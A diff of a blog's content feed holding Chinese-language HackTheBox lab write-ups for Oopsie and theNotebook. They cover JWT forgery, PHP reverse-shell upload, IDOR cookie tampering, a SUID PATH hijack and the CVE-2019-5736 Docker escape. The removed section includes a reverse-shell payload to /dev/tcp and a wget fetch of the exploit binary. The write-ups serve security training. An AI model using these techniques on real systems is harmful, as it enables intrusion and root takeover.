-<p>注册登陆以后的功能就是<strong>notebook</strong>的笔记功能，类似于备忘录吧</p>
-<p>简单测试一下似乎也不存在xss漏洞</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_xss.png" alt="xss"></p>
-<p>发现F12 请求头里的cookie长得很像jwt</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_session.png" alt="session"></p>
-<p>拿到<a href="https://jwt.io/%E5%8E%BB%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AFjwt">https://jwt.io/去解码一下，果然是jwt</a></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwt.png" alt="jwt"></p>
-<p><strong>HEADER</strong>里的kid似乎是从本地7070端口获得一个密钥，7070的端口未开放</p>
-<p><strong>PAYLOAD</strong>部分可以看到<code>admin_cap:0</code>，刚才注册时候已经发现admin用户被注册了</p>
-<p>直接访问<code>xx/admin</code>发现报错Forbidden</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/forbidden.png" alt="forbidden"></p>
-<p>参考：<a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c">https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c</a></p>
-<h2 id="伪造JWT令牌"><a href="#伪造JWT令牌" class="headerlink" title="伪造JWT令牌"></a>伪造JWT令牌</h2><p>思路比较清晰了，自己生成一个私钥对jwt签名，并将当前用户设置为管理员</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out privKey.key 1024</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_privkey.png" alt="privkey"></p>
-<p>用python3在本地起一个服务，让目标从本机获取私钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7070</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwtfake.png" alt="jwtfake"></p>
-<p>用生成的jwt令牌替换原来的，访问/<code>admin</code>，成功进入管理员界面</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_admin.png" alt="admin"></p>
-<p>管理员界面有两个功能（查看Notes和文件上传）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/viewnote.png" alt="viewnote"></p>
-<p>管理员能同时查看所有注册用户和Admin的notes，其中有两篇中泄露了部分信息供参考</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_php.png" alt="php"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backups.png" alt="backups"></p>
-<p>①存在PHP文件执行的问题需要解决 ②服务器上有备份</p>
-<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>如果可以运行php文件，那么我们可以通过PHP文件执行的问题来上传一个php文件反弹shell</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell.png" alt="uploadshell"></p>
-<p>上传shell.php查看文件成功收到反弹回来的shell，升级为交互式shell（关于交互式和非交互式shell的区别可以自行百度）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null -q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</span><br><span class="line">export TERM=xterm #运行xterm 一种终端</span><br><span class="line">ctrl+z #netcat挂后台</span><br><span class="line">stty raw -echo;fg #stty raw 设置原始输入 -echo 禁止回显，当您在键盘上输入时，并不出现在屏幕上 将本地终端置于原始模式，以免干扰远程终端</span><br><span class="line">reset #重置远程终端</span><br><span class="line">或者</span><br><span class="line">script /dev/null  //这是偷懒的方法，用起来不是很方便，但是像su之类的命令都可以执行</span><br><span class="line">或者</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; //需要python环境</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_%E4%BA%A4%E4%BA%92%E5%BC%8Fshell.png" alt="交互式shell"></p>
-<p>查看<code>/etc/passwd</code>中看到有个<code>noah</code>用户</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/finduser.png" alt="finduser"></p>
-<p>从上面我们可以发现已经提示过有备份文件，访问<code>/var/backups</code>，发现备份文件<code>home.tar.gz</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/findbackups.png" alt="findbackups"></p>
-<p>因为目标服务器上有python3环境，可以起一个web服务，把备份文件<code>home.tar.gz</code>下载到本机</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/receivetar.png" alt="receivetar"></p>
-<p>解压备份文件发现里面有<code>noah</code>用户的SSH密钥</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_idrsa.png" alt="idrsa"></p>
-<p>通过SSH连接<code>10.10.10.230</code>，在桌面可以得到<code>user.txt</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/noah.png" alt="noah"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>查看用户当前用户可执行的指令，用户可以不需要密码在docker容器执行部分命令</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_sudo.png" alt="sudo"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp_dev01 xxx</span><br></pre></td></tr></table></figure>
-
-<p>查看docker版本为<strong>18.06.0-ce</strong>,google搜一波发现了CVE-2019-5736docker容器逃逸漏洞</p>
-<p>参考：</p>
-<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
-<p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html</a></p>
-<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>runC是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI(command-line interface) 工具。runC是Docker中最为核心的部分，容器的创建、运行、销毁等操作最终都是通过调用runC完成。</p>
-<p>CVE-2019-5736，导致18.09.2版本之前的Docker允许恶意容器覆盖宿主机上的runC二进制文件，由此使攻击者能够以root身份在宿主机上执行任意命令。恶意容器需满足以下两个条件之一:</p>
-<p>(1)由一个攻击者控制的恶意镜像创建</p>
-<p>(2)攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p>
-<p>POC的利用需要在容器内拥有root，由于覆盖了<code>/bin/sh</code>所以当我们把修改好Payload的二进制文件main下载到docker中执行，下次再有人调用docker容器中的<code>/bin/sh</code>就会触发Payload。</p>
-<p>通过修改payload反弹一个shell到本机以获得root</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.SSH连接到目标主机，通过<code>sudo docker exec -it webapp-dev01 bash</code>在docker上执行命令，（暂且称之为SSH1）同时用另一个在另一个命令行窗口SSH连接到目标主机（SSH2）</p>
-<p>2.在本地改好修改好Payload，执行<code>go build main.go</code>生成二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.16.11/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/maingo.png" alt="maingo"></p>
-<p>3.在二进制文件所在目录用python起一个web服务</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_webserver.png" alt="webserver"></p>
-<p>4.在docker容器中执行命令从本机获取二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.11:8000/main</span><br></pre></td></tr></table></figure>
-
-<p>5.赋予二进制文件最高权限，并执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x main &amp;&amp; ./main</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh1main.png" alt="ssh1main"></p>
-<p>6.监听9999端口（端口根据payload里面的来）</p>
-<p>7.在SSH1中二进制文件运行并覆盖完成<code>/bin/sh</code>，SSH2执行如下命令即可收到反弹回来的shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp-dev01 /bin/sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh2.png" alt="ssh2"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_rootshell.png" alt="rootshell"></p>
-<p>root.txt在<code>/root</code>目录下</p>
-<p>如果流程看不懂，还有终极图解方便理解（文字表达能力较差，各位师傅多担待）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E5%85%A8%E5%B1%80.png" alt="全局"></p>
-<p>可能出现问题的点估计就是提权了，我也好久弹不出Shell…</p>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HackTheBox-Pit</title>
     <url>/2022/01/07/HackTheBox-Pit/</url>
     <content><![CDATA[<h1 id="Hackthebox-Pit"><a href="#Hackthebox-Pit" class="headerlink" title="Hackthebox-Pit"></a>Hackthebox-Pit</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_pwn.png" alt="pwn"></p>
@@ -833,6 +590,249 @@
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox-Oopsie</title>
+    <url>/2022/01/07/HackTheBox-Oopsie/</url>
+    <content><![CDATA[<h1 id="Hackthebox-Oopsie"><a href="#Hackthebox-Oopsie" class="headerlink" title="Hackthebox-Oopsie"></a>Hackthebox-Oopsie</h1><span id="more"></span>
+
+<blockquote>
+<p>目标IP：10.10.10.28</p>
+<p>本机IP：10.10.16.38</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nmap-Oopsie.png" alt="nmap-Oopsie"></p>
+<p>通过nmap信息搜集可以发现目标开放了22和80端口，既然开放了WEB服务，直接访问看看网站的功能和可能存在问题的点。</p>
+<p>网站按钮全部无效，页面底部有邮箱 <code>admin@megacorp.com</code>可能有用。</p>
+<p>其中有处内容存在提示</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/tips-Oopsite.png" alt="tips-Oopsite"></p>
+<p>翻译过来为：<code>我们提供服务来操作生产数据，如报价、客户请求等。请登录以获取服务。</code></p>
+<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a><strong>Burpsuite</strong></h3><p>通过<code>Burpsuite</code>截包，我们在网站地图中找到了可能的登录路径</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/login-Oopsite.png" alt="login-Oopsite"></p>
+<p>直接访问<code>http://10.10.10.28/cdn-cgi/login/</code>进入登录界面</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backlogin-Oopsite.png" alt="backlogin-Oopsite"></p>
+<p>尝试登录，用户名<code>admin</code>或者<code>administrator</code></p>
+<p>密码弱口令爆破无果，看了下官方WP，密码为上一台靶机Archetype的管理员密码<code>MEGACORP_4dm1n!!</code>，登录成功。</p>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>简单看了一下功能，其中<code>Uploads</code>页面提示需要超级管理员权限。</p>
+<p>那么接下来就是如何获取超级管理员权限看能否进行文件上传。</p>
+<p>其中<code>Account</code>页面可以看到当前用户信息</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/account-Oopsite.png" alt="account-Oopsite"></p>
+<p>再看Burpsuite中当前页面的请求包</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/request-Oopsite.png" alt="request-Oopsite"></p>
+<p><code>GET</code>参数<code>content</code>用来进行功能页面的跳转，<code>id</code>参数作用不明</p>
+<p><code>Cookie</code>中<code>user</code>、<code>role</code>分别对应<code>Access ID</code>、<code>Name</code></p>
+<p>两个方向猜测：1.是否存在sql注入 2.是否存在越权漏洞</p>
+<p>经过简单的测试发现sql注入行不通，尝试对<code>id</code>进行爆破。Payload可以用<code>Intruder</code>模块自带的<code>numbers</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/superadmin-Oopsite.png" alt="superadmin-Oopsite"></p>
+<p>结果中看到有几个id请求的响应包长度不同，其中<code>id=30</code>的响应包中发现了<code>super admin</code></p>
+<p>字样，对应的<code>Access ID</code>为<code>86575</code>，直接在URL中修改<code>id=30</code>访问<code>Account</code>页面发现确实是超级管理员账号。</p>
+<p>回到<code>Uploads</code>页面抓包，修改<code>Cookie</code>中的<code>user</code>值为<code>86575</code>发回数据包，可以上传文件了</p>
+<h2 id="文件上传反弹shell"><a href="#文件上传反弹shell" class="headerlink" title="文件上传反弹shell"></a>文件上传反弹shell</h2><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploads-Oopsite.png" alt="uploads-Oopsite"></p>
+<p>文件上传shell文件（注意抓包修改user值为超级管理员），文件上传成功但是不知道上传目录，用目录扫描工具扫一下试试</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell-Oopsite.png" alt="uploadshell-Oopsite"></p>
+<p>发现uploads路径，nc监听2333端口，curl请求test.php反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333 //shell中写的1234端口</span><br><span class="line">curl http://10.10.10.28/uploads/test.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/shell-Oopsite.png" alt="shell-Oopsite"></p>
+<p>查看各种目录文件，在<code>/var/www/html/cdn-cgi/login</code>中发现了<code>db.php</code>文件</p>
+<p>获取内容得到本地用户<code>robert</code>的账号密码</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dbphp-Oopsite.png" alt="dbphp-Oopsite"></p>
+<p>尝试用<code>su xxxx</code>切换用户，报错：<code>su: must be run from a terminal</code></p>
+<p>反弹的shell是个<code>非交互式shell</code>，非交互式shell会有很多问题，比如：</p>
+<ul>
+<li>无法用vim等文本编辑器</li>
+<li>不能用tab补全指令</li>
+<li>不能su</li>
+<li>不能向上使用历史</li>
+<li>…</li>
+</ul>
+<h3 id="知识点-交互式和非交互式"><a href="#知识点-交互式和非交互式" class="headerlink" title="知识点 交互式和非交互式"></a>知识点 交互式和非交互式</h3><p><strong>交互式模式</strong>：就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。</p>
+<p><strong>非交互式模式</strong>：以shell script(非交互)方式执行。在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。当它读到文件的结尾EOF，shell也就终止了。</p>
+<p>网上反弹shell升级交互式用的都是python，但是目标机子上没有python环境，然后去问了树哥，树哥说用<code>script /dev/null</code>,惊了居然su可行了！！</p>
+<p>但是这个shell不是交互式的shell，算是个半交互式，不如交互式方便但也凑合</p>
+<h3 id="知识点-script命令-和-dev-null"><a href="#知识点-script命令-和-dev-null" class="headerlink" title="知识点 script命令 和 /dev/null"></a>知识点 script命令 和 /dev/null</h3><p><strong>script命令</strong></p>
+<p>scirpt就是一个命令，可以制作一份记录输出到终端的记录</p>
+<p><strong>/dev/null</strong></p>
+<p><code>/dev/null</code>代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”</p>
+<p>用途</p>
+<p>1.丢弃标准输出</p>
+<p>2.丢弃标准错误输出</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nullpython-Oopsite.png" alt="nullpython-Oopsite"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag-Oopsite.png" alt="userflag-Oopsite"></p>
+<p>得到user的flag</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>利用<a href="https://www.runoob.com/linux/linux-comm-id.html">Linux id命令</a>发现robert所在组为bugtracker</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/id-Oopsite.png" alt="id-Oopsite"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -g bugtracker 2&gt;/dev/null #Linuxfind命令 -type 设置查找类型为文件 -g 设置组为bugtracker 2&gt;/dev/null 将错误输出到/dev/null 2为Linux文件描述符（错误输出）</span><br><span class="line">ls -al /usr/bin/bugtracker Linux ls基本命令参数不多赘述</span><br></pre></td></tr></table></figure>
+
+<p>其中有个<a href="https://www.cnblogs.com/qlqwjy/p/8665871.html">s权限</a>，当一个可执行程序具有SetUID权限，用户执行这个程序时，将以这个程序所有者的身份执行。前提是这个文件是可执行文件，可就是具有x权限(属组必须先设置相应的x权限)</p>
+<p>执行<code>/usr/bin/bugtracker</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/bug1-Oopsite.png" alt="bug1-Oopsite"></p>
+<p>文件作用是 用户输入一个<code>BUG ID</code>输出BUG报告</p>
+<p>用<a href="https://blog.csdn.net/stpeace/article/details/46641069">strings命令</a>查看<code>/usr/bin/bugtracker</code>的执行过程</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/bug2-Oopsite.png" alt="bug2-Oopsite"></p>
+<p>如箭头所指，文件执行过程中调用了<code>cat</code>命令输出<code>/root/reports/</code>目录下的BUG报告</p>
+<p>由于s权限，robert用户本来无权读取<code>/root/reports/</code>，现在可以了</p>
+<p>我们可以构造一个恶意的cat命令来提权root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH //设置环境变量到/tmp linux下的tmp目录是一个系统产生临时文件的存放目录，同时每个用户都可以对他进行读写操作</span><br><span class="line">cd /tmp/ //切换到/tmp目录下</span><br><span class="line">echo &#x27;/bin/sh&#x27; &gt; cat </span><br><span class="line">chmod +x cat //赋予执行权限</span><br></pre></td></tr></table></figure>
+
+<p>此时，再次执行<code>/usr/bin/bugtracker</code>将会调用<code>/tmp</code>目录下的恶意cat命令，此时我们再次输入任意<code>BUG ID</code>就可以用root权限执行命令了</p>
+<p><strong>注意没有变成root用户</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root-Oopsite.png" alt="root-Oopsite"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag-Oopsite.png" alt="rootflag-Oopsite"></p>
+<p>得到root的flag</p>
+<p>end</p>
+<p><strong>小结</strong></p>
+<p>总的看下来这台靶机其实不算特别难，终究是自己的知识面太狭隘</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/gui951753/article/details/79154496">https://blog.csdn.net/gui951753/article/details/79154496</a></p>
+<p><a href="https://www.cnblogs.com/aaak/p/14067593.html">https://www.cnblogs.com/aaak/p/14067593.html</a></p>
+<p><a href="https://www.linuxprobe.com/shell-dev-null.html">https://www.linuxprobe.com/shell-dev-null.html</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-theNotebook</title>
+    <url>/2022/01/07/HackTheBox-theNotebook/</url>
+    <content><![CDATA[<h1 id="Hackthebox-theNotebook"><a href="#Hackthebox-theNotebook" class="headerlink" title="Hackthebox-theNotebook"></a>Hackthebox-theNotebook</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_pwned.png" alt="pwned"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.11</p>
+<p>目标IP：10.10.10.230</p>
+</blockquote>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1.jwt令牌伪造</p>
+<p>2.CVE-2019-5736 docker容器逃逸</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_nmap.png" alt="nmap"></p>
+<p>还是熟悉的22和80端口，访问下网站</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/notebook.png" alt="notebook"></p>
+<p>测试了一下，登录和注册界面应该不存在sql注入</p>
+<p>尝试注册admin发现用户已经存在了</p>
+<p>注册登陆以后的功能就是<strong>notebook</strong>的笔记功能，类似于备忘录吧</p>
+<p>简单测试一下似乎也不存在xss漏洞</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_xss.png" alt="xss"></p>
+<p>发现F12 请求头里的cookie长得很像jwt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_session.png" alt="session"></p>
+<p>拿到<a href="https://jwt.io/%E5%8E%BB%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AFjwt">https://jwt.io/去解码一下，果然是jwt</a></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwt.png" alt="jwt"></p>
+<p><strong>HEADER</strong>里的kid似乎是从本地7070端口获得一个密钥，7070的端口未开放</p>
+<p><strong>PAYLOAD</strong>部分可以看到<code>admin_cap:0</code>，刚才注册时候已经发现admin用户被注册了</p>
+<p>直接访问<code>xx/admin</code>发现报错Forbidden</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/forbidden.png" alt="forbidden"></p>
+<p>参考：<a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c">https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c</a></p>
+<h2 id="伪造JWT令牌"><a href="#伪造JWT令牌" class="headerlink" title="伪造JWT令牌"></a>伪造JWT令牌</h2><p>思路比较清晰了，自己生成一个私钥对jwt签名，并将当前用户设置为管理员</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out privKey.key 1024</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_privkey.png" alt="privkey"></p>
+<p>用python3在本地起一个服务，让目标从本机获取私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7070</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwtfake.png" alt="jwtfake"></p>
+<p>用生成的jwt令牌替换原来的，访问/<code>admin</code>，成功进入管理员界面</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_admin.png" alt="admin"></p>
+<p>管理员界面有两个功能（查看Notes和文件上传）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/viewnote.png" alt="viewnote"></p>
+<p>管理员能同时查看所有注册用户和Admin的notes，其中有两篇中泄露了部分信息供参考</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_php.png" alt="php"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backups.png" alt="backups"></p>
+<p>①存在PHP文件执行的问题需要解决 ②服务器上有备份</p>
+<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>如果可以运行php文件，那么我们可以通过PHP文件执行的问题来上传一个php文件反弹shell</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell.png" alt="uploadshell"></p>
+<p>上传shell.php查看文件成功收到反弹回来的shell，升级为交互式shell（关于交互式和非交互式shell的区别可以自行百度）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null -q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</span><br><span class="line">export TERM=xterm #运行xterm 一种终端</span><br><span class="line">ctrl+z #netcat挂后台</span><br><span class="line">stty raw -echo;fg #stty raw 设置原始输入 -echo 禁止回显，当您在键盘上输入时，并不出现在屏幕上 将本地终端置于原始模式，以免干扰远程终端</span><br><span class="line">reset #重置远程终端</span><br><span class="line">或者</span><br><span class="line">script /dev/null  //这是偷懒的方法，用起来不是很方便，但是像su之类的命令都可以执行</span><br><span class="line">或者</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; //需要python环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_%E4%BA%A4%E4%BA%92%E5%BC%8Fshell.png" alt="交互式shell"></p>
+<p>查看<code>/etc/passwd</code>中看到有个<code>noah</code>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/finduser.png" alt="finduser"></p>
+<p>从上面我们可以发现已经提示过有备份文件，访问<code>/var/backups</code>，发现备份文件<code>home.tar.gz</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/findbackups.png" alt="findbackups"></p>
+<p>因为目标服务器上有python3环境，可以起一个web服务，把备份文件<code>home.tar.gz</code>下载到本机</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/receivetar.png" alt="receivetar"></p>
+<p>解压备份文件发现里面有<code>noah</code>用户的SSH密钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_idrsa.png" alt="idrsa"></p>
+<p>通过SSH连接<code>10.10.10.230</code>，在桌面可以得到<code>user.txt</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/noah.png" alt="noah"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>查看用户当前用户可执行的指令，用户可以不需要密码在docker容器执行部分命令</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_sudo.png" alt="sudo"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp_dev01 xxx</span><br></pre></td></tr></table></figure>
+
+<p>查看docker版本为<strong>18.06.0-ce</strong>,google搜一波发现了CVE-2019-5736docker容器逃逸漏洞</p>
+<p>参考：</p>
+<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html</a></p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>runC是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI(command-line interface) 工具。runC是Docker中最为核心的部分，容器的创建、运行、销毁等操作最终都是通过调用runC完成。</p>
+<p>CVE-2019-5736，导致18.09.2版本之前的Docker允许恶意容器覆盖宿主机上的runC二进制文件，由此使攻击者能够以root身份在宿主机上执行任意命令。恶意容器需满足以下两个条件之一:</p>
+<p>(1)由一个攻击者控制的恶意镜像创建</p>
+<p>(2)攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p>
+<p>POC的利用需要在容器内拥有root，由于覆盖了<code>/bin/sh</code>所以当我们把修改好Payload的二进制文件main下载到docker中执行，下次再有人调用docker容器中的<code>/bin/sh</code>就会触发Payload。</p>
+<p>通过修改payload反弹一个shell到本机以获得root</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.SSH连接到目标主机，通过<code>sudo docker exec -it webapp-dev01 bash</code>在docker上执行命令，（暂且称之为SSH1）同时用另一个在另一个命令行窗口SSH连接到目标主机（SSH2）</p>
+<p>2.在本地改好修改好Payload，执行<code>go build main.go</code>生成二进制文件</p>
